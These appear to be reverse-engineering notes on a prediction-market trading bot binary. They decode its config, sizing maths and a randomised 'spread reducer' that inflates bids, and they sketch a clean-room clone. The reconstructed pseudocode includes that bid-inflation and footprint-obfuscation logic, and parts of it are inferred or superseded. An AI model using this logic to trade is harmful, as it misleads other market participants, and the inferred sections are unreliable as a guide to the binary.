# Strategy semantics — ARBIGAB bot

Date: 2026-04-19. Evidence: direct x86-64 disassembly of
`bot/bin/arbitrage_bot`. See also `CONFIG_DESERIALIZER.md` for the
upstream BotConfig decode.

The bot markets itself on GitHub as "HFT-FIX-API-FOREX-Integration"
but the binary banner prints `ARBIGAB BOT` and the code is a
Polymarket (yes/no prediction-market) trader. The "FIX/FOREX" framing
is cover.

## 0. High-level flow

```
main
 └── run_single_market(cfg) [0x089670, monomorphized 3×]
      │
      │  parses cfg.strategy (len==14 XOR-match for "spread_capture"
      │  at 0x8bb96..0x8bbb4, overlap-2)
      │
      ├── if strategy == "spread_capture"
      │     // is_bearish is a LOCAL bool derived here, NOT a
      │     // BotConfig field (see §26).
      │     let is_bearish = matches!(
      │         cfg.trade_side.to_lowercase().as_str(),
      │         "no" | "down"
      │     );
      │     run_spread_capture_loop(cfg, is_bearish)       [0x097950]
      │
      └── else  (default — covers "" and "dutch_book")
            run_trading_loop(cfg)                         [0x09ef40]
```

Both loop functions are Rust async state machines, lowered with LTO
into opaque jumptables (28-ish states each). The dispatch byte lives
at `self+0x71b` for run_trading_loop, indexed through the jumptable
at `.rodata:0x6cbb28` (see §14).

## 1. BotConfig default values (non-zero defaults from serde struct-tail)

Found by decoding the post-deserialize fill region at
`deserialize_struct+0x22c0..0x25c0` (0x160c00..0x161004). Each f64
field has its "was explicitly set" bit tested; if clear, a constant
from `.rodata` is moved into the field slot:

| stack flag | default  | assigned field (inferred)         |
|------------|----------|-----------------------------------|
| 0x48       | 5000 u64 | trade_cooldown (ms)               |
| 0x1d8      | 10.0 f64 | (see §5 — possibly max_position_size) |
| 0x1e0      | 50.0 f64 | (see §5)                          |
| 0x1f8      | 2000 u64 | refresh_interval_ms (ms)          |
| 0x208      | 15 u32   | interval_minutes                  |
| 0x328      | 0.5  f64 | balance_factor                    |
| 0x330      | 0.01 f64 | target_spread                     |
| 0x338      | 1.0  f64 | spread_reducer_probability        |
| 0x358      | 0.03 f64 | edge_threshold                    |

Other defaults (0.0 / "" / false) match `Default::default()` per type;
only `default_trade_side = "up"` uses a named `#[serde(default=fn)]`
attribute.

## 2. balance_factor intensity label (printed in banner)

A 4-step cascade at 0x1097b0..0x109814, triplicated across 3
monomorphizations (0x1097c1, 0x19923e, 0x19cfca), maps the f64
balance_factor to a label at startup banner time:

```rust
fn intensity_label(x: f64) -> &'static str {
    if x == 0.0        { "disabled"   }   //  0.0
    else if x < 0.3    { "gentle"     }   //  (0, 0.3)
    else if x < 0.7    { "moderated"  }   //  [0.3, 0.7)
    else               { "aggressive" }   //  >= 0.7
}
```

Evident in rodata: `"aggressive"` at 0x6dba93 (len 10), `"gentle"` at
0x6dba9d (len 6), `"moderatedisabled"` overlapped blob at 0x6cad28
(len 9 / len 8 at offset +8). Thresholds are 0.0, 0.3, 0.7 at
0x6cab98, 0x6cac00, 0x6cabf8.

The banner printed via three `_print` calls is:

```
🚀 Starting trading loop (strategy: {strategy})
📄 Loading config from: {path}
ARBIGAB BOT
Config File:      {path}
Strategy:         {strategy}
Symbol:           {symbol}
Interval:         {interval_minutes}
Spread Threshold: ${spread_threshold} ({cents}¢)
Trade Cooldown:   {trade_cooldown} ms
Max Order Size:   {max_buy_order_size} shares
Balance Factor:   {balance_factor} ({intensity_label})
```

So `balance_factor` is the primary "gamble-level" dial in the
config. The name "enable_gamble" (see §4) is a SEPARATE field, used
differently.

## 3. Sizing formula (place_batch_buy_orders — TWO-PASS, fully decoded)

The sizing logic in `place_batch_buy_orders` is split across two
non-adjacent code regions:

### Pass A — deterministic skew + clamp (0x0c5498..0x0c5582)

```
c54bc: mov  0x30(%rbx), %rdi              ; load TradingClient ref
c54c0: call get_position(rdi)             ; → (xmm0, xmm1) = (yes_pos, no_pos)
c54c5: movsd %xmm0, (%rbx)
c54c9: movsd %xmm1, 0x8(%rbx)             ; store positions back to state
c54ce: mov  0x30(%rbx), %rbx              ; rbx = config (chained pointer)
c54d2: movsd 0x160(%rbx), %xmm2           ; xmm2 = cfg.inventory_skew
c54de: ucomisd %xmm2, xmm3=0              ; if skew <= 0:
c54eb: jae  c55be                         ;   take "no skew" path (xmm0 := A)
c5503: subsd %xmm0, %xmm1                 ; xmm1 = no_pos - yes_pos
c5507: mulsd %xmm1, %xmm2                 ; xmm2 = skew * (no - yes)
c550b: mulsd 0x6caba8 (=0.5), %xmm2       ; xmm2 = skew * (no - yes) * 0.5  = delta
c5513: movapd %xmm4, %xmm1                ; xmm4 holds A = max_buy_order_size
c5517: addsd  %xmm2, %xmm1                ; xmm1 = A + delta   (yes_target)
c551b: subsd  %xmm2, %xmm4                ; xmm4 = A - delta   (no_target)
c5531: unpcklpd %xmm1, %xmm4              ; pack (no_t, yes_t)
c5535: maxpd  zero, packed                ; clamp lower → 0
c5541: minpd  2A_packed, packed           ; clamp upper → 2A
c5555: call round (lower lane)            ; round(no_target)
c5572: call round (upper lane)            ; round(yes_target)
```

Result: `(yes_target, no_target)` as **rounded** non-negative f64s
≤ `2 * cfg.max_buy_order_size`.

So the deterministic skew is exactly:
```rust
let A     = cfg.max_buy_order_size;
let skew  = cfg.inventory_skew;            // 0.0 = balanced, >0 = skew
let delta = skew * (no_pos - yes_pos) * 0.5;
let mut yes_target = (A + delta).clamp(0.0, 2.0 * A).round();
let mut no_target  = (A - delta).clamp(0.0, 2.0 * A).round();
```

Note: when **already long YES** (yes_pos > no_pos), `delta < 0`, so
yes_target shrinks and no_target grows — i.e. `inventory_skew`
**rebalances away from the heavier side**.

### Pass B — two-roll randomisation (0x0c7922..0x0c79aa)

Roughly 0x2400 bytes downstream (after the "Position: UP=…" log
line and some allocations are freed):

```
c7922: movsd 0x6cabb8 (=1.0), %xmm1       ; upper bound
c7929: xorpd %xmm0, %xmm0                 ; lower bound = 0
c7931: call rand::gen_range(0.0, 1.0)     ; xmm0 = r1 ∈ [0,1)
c7936: movsd %xmm0, 0x120(%rsp)           ; save r1
c7949: ; (load 1.0 / 0.0 again)
c795e: call rand::gen_range(0.0, 1.0)     ; xmm0 = r2 ∈ [0,1)
c7963: movsd %xmm0, 0x160(%rsp)           ; save r2
c7974: movsd 0x120(%rsp), %xmm0           ; r1
c797d: mulsd (rax), %xmm0                 ; r1 * yes_target
c7988: call round                         ; → yes_actual
c799b: movsd 0x160(%rsp), %xmm0           ; r2
c79a4: mulsd (rax), %xmm0                 ; r2 * no_target
c79a8: call round                         ; → no_actual
```

Final orders sent: `yes_actual` shares for YES, `no_actual` shares
for NO. Expected fill per side = `target / 2`; over many batches
the bot delivers ~half its nominal max size on average, with
high variance. **This pass has no separate enable flag in the
disassembly window** — it always runs in the dutch-book path.
The `enable_gamble` bool only gates the *spread-reducer*
(§5/§10), not this size-randomiser.

| address | role                                    |
|---------|-----------------------------------------|
| 0x0c5498 | sizing entry — deterministic pass start |
| 0x0c5503 | inventory_skew × position-delta multiply |
| 0x0c550b | × 0.5 multiplier (`.rodata:0x6caba8`)   |
| 0x0c5535/41 | maxpd/minpd clamp to [0, 2A]         |
| 0x0c7931 | gen_range #1 (yes-side roll)            |
| 0x0c795e | gen_range #2 (no-side roll)             |

So the verified formula (replacing the earlier inferred one in §11):

```rust
let A        = cfg.max_buy_order_size;
let (yes_pos, no_pos) = client.get_position();
let delta    = cfg.inventory_skew * (no_pos - yes_pos) * 0.5;
let yes_target = (A + delta).clamp(0.0, 2.0 * A).round();
let no_target  = (A - delta).clamp(0.0, 2.0 * A).round();
// log "Position: UP={yes_pos}, DOWN={no_pos}, max=…, slug=…"
let mut rng = rand::thread_rng();
let yes_actual = (rng.gen_range(0.0..1.0) * yes_target).round() as u64;
let no_actual  = (rng.gen_range(0.0..1.0) * no_target ).round() as u64;
```

Confirmed: `cfg.inventory_skew` lives at struct offset **0x160** of
the chained config pointer (BotConfig is embedded in a parent
state struct). When `inventory_skew == 0`, the bot quotes A on
both sides regardless of position — the "no rebalancing" mode.

## 3-old. Original (now-superseded) sizing summary

Observed SSE2 arithmetic produces two target sizes per batch from a
shared base A, skewed by the signed book-imbalance, clamped to
[0, 2A], then each target is independently multiplied by a fresh
uniform random sample and rounded:

```rust
// A = cfg.max_buy_order_size (clap default 5.0)
// ask, bid = current best prices
// position = inventory skew (signed). Likely derived from
//            cfg.inventory_skew × (held_yes - held_no).
let delta = (ask - bid) * position * 0.5_f64;
let mut yes_target = A + delta;
let mut no_target  = A - delta;

yes_target = yes_target.clamp(0.0, 2.0 * A);
no_target  = no_target .clamp(0.0, 2.0 * A);

let r_yes: f64 = rng.gen_range(0.0..1.0);   // 0x0c7922 pair
let r_no:  f64 = rng.gen_range(0.0..1.0);   // 0x0c794f pair
let yes_actual = (r_yes * yes_target).round() as u64;
let no_actual  = (r_no  * no_target ).round() as u64;
```

The 0.5 multiplier is hard-coded at `.rodata:0x6caba8`. The upper
bound 1.0 for `gen_range` lives at `.rodata:0x6cabb8`. The role of
`cfg.inventory_skew` as the `position` multiplier is inferred —
it's loaded from the config struct near the formula but I haven't
yet traced the exact offset.

**This is the principal "randomness layer":** every batch sends an
*expected* 50% of the target size on each side, uniformly distributed
in [0, target]. Over many batches the mean fill is `target/2`, not
`target`.

## 4. enable_gamble field

- Length 13 in the deserializer jumptable (same arm as
  `target_spread`), fast-path at 0x15f119. Field name at
  `.rodata:0x6dc9e8`.
- Per the serde fill region (§1), none of the f64 default-fill flags
  map to a field with a non-zero default of a type compatible with
  enable_gamble's slot; the field is most likely `Default::default()`
  → `false` (bool) or `""` (String).
- "moderated"/"disabled" strings in rodata are consumed by the
  balance_factor intensity cascade (§2), NOT by enable_gamble.
- No lowered LEA/cmp reference to a "true"/"enabled"/"on" literal
  was found for this field — strongly suggesting it is a **bool**.
  The offset inside the struct is not yet pinned; the obvious move
  after more tracing is to look at which `cmpb $0x0, offset(%rbx)`
  branch gates the "🎲 Spread reducer triggered!" log path (§5).

**Working hypothesis:** `enable_gamble: bool` — global kill-switch for
the spread-reducer / randomised-size behaviour. When `false`, the
bot places deterministic orders at `yes_target`/`no_target` without
the two-roll randomisation and without the inflation block in §5.

## 5. Spread reducer mechanics

Evidence: log literal at `.rodata:0x6d9822`:

```
] 🎲 Spread reducer triggered! Prices inflated by $ → UP bid $, DOWN bid $
```

(The 🎲 dice emoji is a tell — this is the gambling layer.) The
log's `fmt::Arguments` struct is at `.data.rel.ro:0x868cf0`.

The two numeric config knobs are:

- `spread_reducer_probability: f64` (default 1.0, §1 flag 0x338)
- `spread_reducer_value: f64` (default 0.0)

Expected semantics (from the log text and the three variables it
prints — inflation amount, modified UP bid, modified DOWN bid):

```rust
// Before placing a batch, probabilistically inflate our own bid
// prices so the market sees a tighter apparent spread.
if rng.gen_range(0.0..1.0) < cfg.spread_reducer_probability {
    let bump = cfg.spread_reducer_value;
    up_bid   += bump;
    down_bid += bump;
    log_info!("🎲 Spread reducer triggered! Prices inflated by ${bump} \
               → UP bid ${up_bid}, DOWN bid ${down_bid}");
}
```

This is a **price-inflation / spoof-narrowing** mechanic: the bot
posts bids above its true reservation price a fraction of the time,
making the book look tighter than it really is. Combined with the
size-randomisation in §3, the per-batch micro-structure becomes
hard to tell apart from organic noise — a textbook gambling /
market-manipulation tell.

The exact call site is inlined into run_trading_loop's state
machine; the fmt struct is accessed via a relocated pointer so a
direct LEA scan misses it (hence no `LEA 0x868cf0` hits).

## 6. Dutch-book vs spread-capture strategies

- **dutch_book** (strategy=="" or =="dutch_book"): runs
  `run_trading_loop`. This is the classic arbitrage mode — enter
  both YES and NO sides such that the sum of stakes is less than
  the guaranteed payout. The price-inflation (§5) is applied before
  submitting.

- **spread_capture** (strategy=="spread_capture"): runs
  `run_spread_capture_loop` with an `is_bearish` bool derived from
  `trade_side`. **Corrected by §28**: this is NOT a two-sided
  market-maker. It is a one-sided buy-only accumulator of a single
  outcome token (YES when `is_bearish=false`, NO when
  `is_bearish=true`). The `Side` byte is hardcoded to `Buy` at
  `0xdf7da`; the bool only selects which asset slot is accumulated,
  never the buy/sell direction. See §28b.

The third-party log literals referencing "edge_threshold", "Spread
detected!", "Fallback timer expired" etc. all live in the
spread_capture rodata cluster (0x6d9800..0x6dba00), confirming that
loop is the market-making code path.

## 7. "Dangerous parts" — what to bypass when cloning

For a clean-room re-implementation that keeps the strategy but skips
the manipulative / house-cheating pieces, drop:

1. **§5 spread_reducer**: the probabilistic bid inflation. Set
   `spread_reducer_value = 0.0` or compile-out the branch entirely.
   Posting bids above your true reservation price is wash-trading
   adjacent behaviour.
2. **§3 two-roll size randomisation**: replace
   `round(gen_range(0,1) * target)` with just `target.round()`. The
   randomisation exists to obfuscate the bot's footprint, not to
   improve PnL.
3. Anything gated by `enable_gamble` (§4) — treat that flag as a
   hard `false` in the clone.

Core arbitrage/market-making logic to KEEP:
- The yes/no sizing skew `A ± (ask-bid)*position*0.5` (§3)
- The spread-threshold gate and edge-threshold guard
- The cooldown and refresh loops

## 8. Key file offsets / symbols

| address   | symbol / role                                         |
|-----------|-------------------------------------------------------|
| 0x089670  | run_single_market closure (strategy dispatch)         |
| 0x097950  | run_spread_capture_loop closure                       |
| 0x09ef40  | run_trading_loop closure                              |
| 0x0c5498  | place_batch_buy_orders sizing arithmetic              |
| 0x0c7922  | gen_range call #1 (yes-side randomiser)               |
| 0x0c794f  | gen_range call #2 (no-side randomiser)                |
| 0x15ea80  | BotConfig deserialize_struct (see CONFIG_DESERIALIZER.md) |
| 0x160c00  | Default-fill region (flags → constants)               |
| 0x176fc0  | default_trade_side = "up"                             |
| 0x6caba0  | f64 5.0   (max_buy_order_size clap default)           |
| 0x6caba8  | f64 0.5   (sizing delta multiplier; balance_factor default) |
| 0x6cabb8  | f64 1.0   (gen_range upper bound; spread_reducer_probability default) |
| 0x6cabe8  | f64 0.01  (target_spread default)                     |
| 0x6cabf8  | f64 0.7   (aggressive threshold)                      |
| 0x6cac00  | f64 0.3   (gentle/moderated threshold)                |
| 0x6cac18  | f64 0.03  (edge_threshold default)                    |
| 0x6cac20  | f64 10.0  (default for flag 0x1d8)                    |
| 0x6cac28  | f64 50.0  (default for flag 0x1e0)                    |
| 0x6cad28  | overlapped "moderatedisabled" literal blob            |
| 0x6dba93  | "aggressive" / "gentle" literal blob                  |
| 0x6d9822  | "🎲 Spread reducer triggered!" log line               |
| 0x868cf0  | fmt::Arguments for the reducer log                    |
| 0x6cb324  | jumptable: run_trading_loop state dispatch (28-ish)   |
| 0x6cc9b4  | jumptable: BotConfig deserializer field-length switch |

## 9. Complete BotConfig field roster (from deserialize_struct length jumptable)

The length-dispatch jumptable at `.rodata:0x6cc9b4` covers field-name
lengths 4..26. Each entry is a signed 32-bit offset from 0x6cc9b4.
Entries pointing to 0x15f520 mean "unknown field" (error). Decoded:

| name length | handler addr | fields at this length                                                            |
|-------------|--------------|----------------------------------------------------------------------------------|
| 4           | 0x15ece1     | `slug`                                                                           |
| 6           | 0x15f0a8     | `symbol`                                                                         |
| 7           | 0x15ef0c     | `dry_run`                                                                        |
| 8           | 0x15f340     | `strategy`, `cooldown`  *(two-way `bcmp` split)*                                 |
| 9           | 0x15f3bc     | `log_price`, `min_price`, `max_price`  *(XOR-pair cascade at 0x15f3c0..0x15f418)*|
| 10          | 0x15ef76     | `order_size`, `trade_side`                                                       |
| 13          | 0x15f119     | `enable_gamble`, `target_spread`                                                 |
| 14          | 0x15f1bc     | `trade_cooldown`, `balance_factor`, `current_market`, `edge_threshold`, `inventory_skew` |
| 16          | 0x15f4e5     | `interval_minutes`, `spread_threshold`                                           |
| 17          | 0x15f466     | `max_position_size`                                                              |
| 18          | 0x15edc0     | `stop_before_end_ms`, `max_buy_order_size`                                       |
| 19          | 0x15f00d     | `refresh_interval_ms`                                                            |
| 20          | 0x15ee90     | `spread_reducer_value`                                                           |
| 22          | 0x15ed45     | `cancel_orders_on_start`                                                         |
| 26          | 0x15f2c4     | `spread_reducer_probability`                                                     |

Lengths 5, 11, 12, 15, 21, 23-25 are unhandled (the CLI-only flags
`no_log_price` (12) and `no_cancel_orders_on_start` (25) are merged
into the JSON struct elsewhere).

**Total: 22 serde-recognised JSON fields in `BotConfig`.** The
deserializer's seen-bit stack offsets (from the `cmpq $0, N(%rsp)`
before each field-handler body) give a reproducible ordering:

| field                            | seen-bit stack offset | handler entry |
|----------------------------------|-----------------------|---------------|
| `spread_reducer_probability`     | 0x218                 | 0x15f2c4      |
| `strategy`                       | 0x348                 | 0x15f340      |
| `log_price`                      | 0x338                 | 0x15f419      |
| `max_position_size`              | 0x1e0                 | 0x15f466      |
| `cancel_orders_on_start`         | 0x1e8 (byte flag)     | 0x15ed45      |
| `dry_run`                        | 0x1a0 (byte flag)     | 0x15ef0c      |
| `spread_reducer_value`           | 0x1f0                 | 0x15ee90      |
| `max_buy_order_size` / `stop_before_end_ms` | 0x1f0 / 0x360 | 0x15edc0  |
| `edge_threshold` (§1 flag 0x358) | 0x358                 | 0x15f1bc      |
| `refresh_interval_ms`            | 0x1f8                 | 0x15f00d      |
| `interval_minutes` / `spread_threshold` | 0x208          | 0x15f4e5      |
| `trade_cooldown`                 | 0x48                  | 0x15f1bc      |
| `balance_factor`                 | 0x328                 | 0x15f1bc      |
| `target_spread`                  | 0x330                 | 0x15f119      |
| `slug`                           | 0x360                 | 0x15ece1      |

Fields sharing a handler use a secondary XOR-pair or `bcmp` dispatch
inside the handler (e.g. `strategy` vs `cooldown` at len 8 uses a
single 8-byte movabs compare `"strategy"` == `0x7967657461727473`, then
falls through to `bcmp` for `cooldown`).

## 10. Spread-reducer price-inflation (verified)

The spread-reducer mechanism is implemented inside
`run_trading_loop` (inlined into the tokio poll state machine at
0x089000..0x0c3000). The exact inflation path at 0x0c1a1f..0x0c1aa7:

```
c1a1f: cmpb $0x0, 0x150(%rcx)      ; bool gate (spread_reducer enabled?)
c1a26: je   skip                    ; byte is the per-batch enable
c1a31: movsd 0x98(%rax), %xmm1      ; load spread_reducer_probability
c1a3d: ucomisd %xmm0, %xmm1         ; xmm0 = 0.0
c1a41: jbe  skip                    ; skip if probability <= 0
c1a4c: movsd 0xa0(%rax), %xmm1      ; load spread_reducer_value
c1a58: jbe  skip                    ; skip if value <= 0
c1a5e: call thread_rng()
c1a69: call gen_range(0.0 .. 1.0)   ; xmm0 = uniform sample
c1a73: movsd 0x98(%rax), %xmm1      ; reload probability
c1a7f: jbe  skip                    ; skip if probability <= sample
c1a96: movupd (%r15), %xmm0         ; load (up_bid, down_bid) packed
c1a9b: movsd  (%rbx), %xmm1         ; xmm1 = value
c1a9f: unpcklpd %xmm1, %xmm1        ; broadcast to both lanes
c1aa3: addpd  %xmm0, %xmm1          ; (up_bid+value, down_bid+value)
c1aa7: movupd %xmm1, (%r15)         ; store both inflated bids
```

So the reducer:
1. Requires a parent-struct enable byte at offset 0x150 (likely
   `enable_gamble` propagated from config). If zero, no-op.
2. Requires both `spread_reducer_probability > 0` **and**
   `spread_reducer_value > 0`.
3. Rolls uniform; triggers when `sample < probability`.
4. Adds `spread_reducer_value` to **both** UP and DOWN bid prices
   simultaneously (symmetric inflation — *not* just the side you're
   buying).

Adding to BOTH bids is the give-away: this is not "adjust my bid
to close the spread", it's "inflate the book on both sides before
quoting". It's a spoofing-adjacent tell.

Confirmed field offsets (from a register holding the config
pointer inside the state machine, rax-relative):

| offset | field                         | type |
|--------|-------------------------------|------|
| 0x98   | `spread_reducer_probability`  | f64  |
| 0xa0   | `spread_reducer_value`        | f64  |

And a **separate** enable byte at 0x150 from the task's state
pointer (rcx) — this is the `enable_gamble` kill-switch (§4). When
false, the whole inflation block is short-circuited to `skip`.

## 11. Extended rust pseudocode reconstruction

Best-effort clean-room reconstruction combining all findings:

```rust
#[derive(Deserialize)]
struct BotConfig {
    // identity / market
    symbol:                 String,
    slug:                   Option<String>,
    current_market:         String,
    strategy:               String,                       // "" | "dutch_book" | "spread_capture"
    trade_side:             String,  // "up" | "down"    (default = "up")
    interval_minutes:       u32,     // default 15
    min_price:              f64,     // default 0.0
    max_price:              f64,     // default 1.0

    // sizing
    order_size:             f64,
    max_buy_order_size:     f64,     // clap default 5.0
    max_position_size:      f64,     // default 10.0  (§1 flag 0x1d8)
    inventory_skew:         f64,     // directional multiplier for ±delta

    // edge / spread gates
    edge_threshold:         f64,     // default 0.03
    spread_threshold:       f64,     // default 50.0  (cents? — printed as $)
    target_spread:          f64,     // default 0.01

    // spread reducer (gambling/spoof layer)
    spread_reducer_probability: f64, // default 1.0
    spread_reducer_value:       f64, // default 0.0
    enable_gamble:              bool, // master kill-switch

    // pacing
    trade_cooldown:         u64,     // ms, default 5000
    refresh_interval_ms:    u64,     // ms, default 2000
    stop_before_end_ms:     u64,     // ms, default 0
    balance_factor:         f64,     // default 0.5 (printed label: disabled/gentle/moderated/aggressive)

    // flags
    dry_run:                bool,
    log_price:              bool,
    cancel_orders_on_start: bool,
}

// ───── Core trading loop (simplified) ─────

async fn run_trading_loop(cfg: Arc<BotConfig>, state: Arc<RwLock<Position>>) {
    loop {
        tokio::time::sleep(Duration::from_millis(cfg.refresh_interval_ms)).await;

        // stop_before_end_ms gate
        let window_remaining = market.window_end_ms() - now_ms();
        if cfg.stop_before_end_ms > 0 && window_remaining < cfg.stop_before_end_ms {
            info!("Only {}s until window end, stopping early (stop_before_end_ms={})",
                  window_remaining / 1000, cfg.stop_before_end_ms);
            break;
        }

        // fetch best bid/ask
        let (ask, bid) = orderbook.best_prices();
        let spread = ask - bid;
        if spread < cfg.spread_threshold { continue; }

        // position-limit gate
        let pos = state.read().await.net_shares();
        if pos.abs() >= cfg.max_position_size {
            info!("At max position {}, waiting for SELL fill", pos);
            continue;
        }

        // edge check
        let edge = compute_edge(&cfg, ask, bid);
        if edge < cfg.edge_threshold { continue; }

        // dry_run short-circuit
        if cfg.dry_run { continue; }

        place_batch_buy_orders(&cfg, ask, bid, pos).await;

        // cooldown
        tokio::time::sleep(Duration::from_millis(cfg.trade_cooldown)).await;
        info!("Cooldown elapsed, cancelling orders...");
        cancel_open_orders().await;
    }
}

fn place_batch_buy_orders(cfg: &BotConfig, ask: f64, bid: f64, pos: f64) {
    let A = cfg.max_buy_order_size;
    let delta = (ask - bid) * pos * cfg.inventory_skew * 0.5;

    // Book-inflation layer (§5, §10) — spoofs a tighter spread
    let (mut up_bid, mut down_bid) = (bid, bid);
    if cfg.enable_gamble
        && cfg.spread_reducer_probability > 0.0
        && cfg.spread_reducer_value > 0.0
        && rand::thread_rng().gen_range(0.0..1.0) < cfg.spread_reducer_probability
    {
        up_bid   += cfg.spread_reducer_value;
        down_bid += cfg.spread_reducer_value;
        info!("🎲 Spread reducer triggered! Prices inflated by ${} → UP bid ${up_bid}, DOWN bid ${down_bid}",
              cfg.spread_reducer_value);
    }

    // Size-randomisation layer (§3) — uniform [0, target] on each side
    let yes_target = (A + delta).clamp(0.0, 2.0 * A);
    let no_target  = (A - delta).clamp(0.0, 2.0 * A);
    let mut rng    = rand::thread_rng();
    let yes_actual = (rng.gen_range(0.0..1.0) * yes_target).round() as u64;
    let no_actual  = (rng.gen_range(0.0..1.0) * no_target ).round() as u64;

    // intensity_label is banner-only — doesn't gate runtime behaviour
    place_limit_buy("YES", up_bid,   yes_actual);
    place_limit_buy("NO",  down_bid, no_actual);
}
```

## 11a. edge_threshold gate (spread_capture side, 0x0df00f..0x0df0c5)

Verified directly: after the best-bid/best-ask pair is loaded from
the side-indexed price table, the spread is computed and
compared against cfg.edge_threshold:

```
df00f: mov  0x1f0(%rbx), %rax           ; rax = price_table (some market feed)
df016: cmpb $0x0, 0x40(%rax)            ; ready-flag
df01a: je   df357                       ; not ready → early return
df020: movzbl 0x25a(%rbx), %ecx         ; side index (0/1)
df027: shl  $0x5, %ecx                  ; × 32  (each row = 32 B)
df02a: movupd (%rax,%rcx,1), %xmm0      ; load (best_bid, best_ask) pair
df036: movupd %xmm0, 0x1f8(%rbx)        ; cache into state[0x1f8..0x208]
...
df072: movsd 0x0(%r13), %xmm0           ; r13 = &state[0x1f8] = best_bid
df07c: ucomisd %xmm0, %xmm2=0
df080: jae  df4a7                       ; bid<=0 → abort
df086: movsd (%r15), %xmm1              ; r15 = &state[0x200] = best_ask
df08b: ucomisd %xmm1, %xmm2=0
df08f: jae  df4a7                       ; ask<=0 → abort
df09c: subsd %xmm0, %xmm1                ; spread = ask - bid
df0a0: movsd %xmm1, 0x208(%rbx)          ; state[0x208] = spread
df0a8: mov  0x60(%rbx), %rax             ; rax = &cfg  (state[0x60] is config ptr)
df0ac: movsd 0x28(%rax), %xmm0           ; xmm0 = cfg.edge_threshold
df0b1: ucomisd %xmm1, %xmm0              ; threshold vs spread
df0b5: jbe  df5ca                        ; jump (take trade) if threshold <= spread
df0bb: cmpb $1, 0x38(%rax)               ; cfg.log_price flag
df0bf: jne  df240                        ; skip log if disabled
;  else: print "Spread $<x> below edge threshold $<t>, waiting..."
```

Newly pinned BotConfig offsets (chained from `state[0x60]`):

| cfg offset | field             | type | evidence               |
|------------|-------------------|------|------------------------|
| 0x28       | `edge_threshold`  | f64  | ucomisd at 0x0df0b1    |
| 0x38       | `log_price`       | bool | cmpb at 0x0df0bb       |
| 0x160      | `inventory_skew`  | f64  | mulsd at 0x0c5507      |

And from `run_side_capture`'s per-side state struct:

| state offset | field              |
|--------------|--------------------|
| 0x60         | `&BotConfig` (pointer to the config) |
| 0x1f0        | `&price_table`     |
| 0x1f8..0x200 | cached (best_bid, best_ask) |
| 0x208        | cached spread      |
| 0x25a        | active-side index (0=UP, 1=DOWN) |
| 0x80         | up_position f64    |
| 0xa0         | down_position f64  |
| 0x210        | cfg.max_position_size mirror |
| 0x288        | TradingClient handle |

## 11b. max_position_size enforcement (spread_capture side)

`run_side_capture` (a closure inside `run_spread_capture_loop`)
contains the position-cap gate. At 0x0e0a72..0x0e0a8b the format
arguments for the "At max position" log are loaded:

```
e0a72: lea 0x210(%rbx), %rax    ; ptr to max_position_size (f64)
e0a79: lea 0x80(%rbx),  %rcx    ; ptr to up_position      (f64)
e0a80: lea 0xa0(%rbx),  %rdx    ; ptr to down_position    (f64)
e0a87: mov 0x60(%rbx),  %rsi    ; String ptr (slug)
e0a8b: add $0x18, %rsi          ;   ... +24 = .ptr field
```

So the spread-capture state struct holds:
- per-side position counters at offsets 0x80 (UP) and 0xa0 (DOWN)
- `BotConfig.max_position_size` mirrored / referenced at 0x210
- the slug String at 0x60

The gate fires when `max(up_pos, down_pos) >= max_position_size`,
and the bot waits for a sell-side fill before posting more buys.
This is the only pre-trade size cap besides the per-batch
`max_buy_order_size`.



- Exact `inventory_skew` multiplier role — confirmed to be an f64
  config field but its usage inside the batch sizing formula is
  still inferred from surrounding arithmetic at 0x0c5498.
- Struct offsets for `current_market` and `trade_side` — both are
  Strings, likely in the first 0x70 bytes of BotConfig. The
  banner printer at 0x109800 can pin them; the code is
  monomorphized 3× at 0x109800/0x199600/0x19d380.
- Full run_spread_capture_loop state decode (28 async states).
  Most are trivial `.await` wrappers; the arithmetic states are
  shared with run_trading_loop via the same
  `place_batch_buy_orders` helper.
- Websocket message → state transitions inside the tokio
  generator (`run_user_ws_monitor` state machine at 0xb5f50 uses
  state byte at `self+0x660` with jumptable at 0x6cb5e8).

## 11c. cancel_orders_on_start gate (run_trading_loop, 0x0f7824)

Located inside
`arbitrage_bot::websocket::market_ws::run_trading_loop::{closure}`
(symbol `_ZN13arbitrage_bot9websocket9market_ws16run_trading_loop...4055`).

State-struct booleans are loaded sequentially at 0x0f73fc..0x0f7437:

```
0f73fc: movzbl 0x718(%rbp),%eax       ; bool A → mirror at +0x71c
0f7403: mov    %al,0x71c(%rbp)
0f7428: movzbl 0x719(%rbp),%ebp       ; cancel_orders_on_start → %bpl
0f742f: movzbl 0x71a(%r15),%eax       ; bool C → mirror at +0x71d
0f7437: mov    %al,0x71d(%r15)
```

State-struct offsets in run_trading_loop:
| offset | type    | role                                |
|--------|---------|-------------------------------------|
| 0x110  | ptr     | TradingClient (cancel-orders target) |
| 0x718  | u8 bool | (one of dry_run / log_price / enable_gamble) |
| 0x719  | u8 bool | **cancel_orders_on_start** (PINNED) |
| 0x71a  | u8 bool | (one of dry_run / log_price / enable_gamble) |
| 0x71b  | u8      | async dispatch state byte           |

The actual gate is at 0x0f7824:

```
f7824: test  %bpl,%bpl
f7827: je    0xf7b31                 ; if FALSE → "Skipping order cleanup"
                                      ; (tracing meta @ 0x86a340, str @ 0x6db313)
f782d..f793b: format & println "🧹 Cleaning up any previous open orders..."
              (tracing meta indirectly via 0x86a360, str @ 0x6db352)
f7966: mov   0x110(%rbp),%rax        ; load TradingClient ptr
f796d: add   $0x10,%rax              ; +16 = inner client field
f798e: call  0xfe670 <TradingClient::cancel_all_open_orders::{closure}>
```

Semantics:
```rust
if cancel_orders_on_start {
    info!("🧹 Cleaning up any previous open orders...");
    let n = trading_client.cancel_all_open_orders().await?;
    info!("✅ Cancelled {} old orders", n);
} else {
    info!("⏭️  Skipping order cleanup (cancel_orders_on_start=false)");
}
```

The `--no-cancel-orders-on-start` clap flag (string at 0x6dc890+ in
`.rodata` arg-list blob) is the user-facing way to set this to
false; useful for "multi-bot on same wallet" deployments per the
help text.

## 12a. dry_run banner mirror (CachedParkThread::block_on)

The startup banner reads the dry_run flag from a state-struct
mirror at +0x17c (different mirror than the run_trading_loop
state). At 0x0109c25 (and again at 0x0019968f in another
monomorphization):

```
109c25: movzbl 0x17c(%rbx),%eax        ; dry_run as bool→u64 (0 or 1)
109c2c: test   %rax,%rax
109c2f: lea    0x6cd278(%rip),%rcx     ; "LIVE" (4 chars)
109c36: lea    0x6dbc9d(%rip),%rdx     ; "DRY RUN" (7 chars)
109c3d: cmovne %rdx,%rcx               ; if dry_run, pick "DRY RUN"
